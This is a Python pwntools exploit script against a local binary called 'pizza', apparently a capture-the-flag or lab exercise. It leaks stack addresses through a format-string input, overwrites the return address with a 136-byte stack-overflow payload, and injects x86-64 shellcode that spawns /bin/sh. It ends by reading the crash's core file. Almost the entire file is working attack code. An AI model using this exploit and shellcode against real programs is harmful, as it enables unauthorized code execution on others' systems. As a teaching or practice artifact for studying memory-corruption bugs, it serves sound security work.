
#!/usr/bin/env python3

from pwn import *

#context.log_level = 'error'

# Executable and Linkable Format
elf = ELF("./pizza")

context(arch='amd64', os='linux', endian='little', word_size=64)

#getname_address = elf.symbols["getname"]

shellcode = [0x48, 0x31, 0xc0, 0x50, 0x48, 0x89, 0xe6, 0x48, 0x89, 0xe2, 0x48, 0xbb, 0x3b, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x88, 0xd8, 0x53, 0x48, 0x89, 0xe7, 0x48, 0xff, 0xc7, 0x0f, 0x05]
print("len of shellcode is", len(shellcode), "bytes")

input1 = b"%p " * (17)

victim = process("./pizza")
print(str(victim.recvline(), "latin-1"))
victim.sendline(input1)
mem = str(victim.recvline(), "latin-1")
print(mem)
mem = mem.split()
victim.sendline(b"10")

for i in range(7):
    print(str(victim.recvline(), "latin-1"))


# the place where it crashed was 136
base_stack_pointer_offset = 136
payload_size = 136
payload = "A" * payload_size
payload = bytearray(payload, encoding="latin-1")
print(mem)
address = int(mem[9], 16)
ret_addr_s = (base_stack_pointer_offset - payload_size - 1)
ret_addr_e = ret_addr_s - 4
address = address.to_bytes(8, byteorder="little")
print(address)
payload[ret_addr_s:] = address  #0x20
print(shellcode)
payload[-9*8 : -6 * 8] = shellcode
print(payload)
victim.sendline(payload)

print(str(victim.recvline(), "latin-1"))
#victim.recvline()
#victim.sendline(b"10")

#victim.sendline(payload)
victim.wait()
#victim.interactive()
core = victim.corefile
rsp = core.rsp
rbp = core.rbp
rip = core.rip
print("rip is", rip)
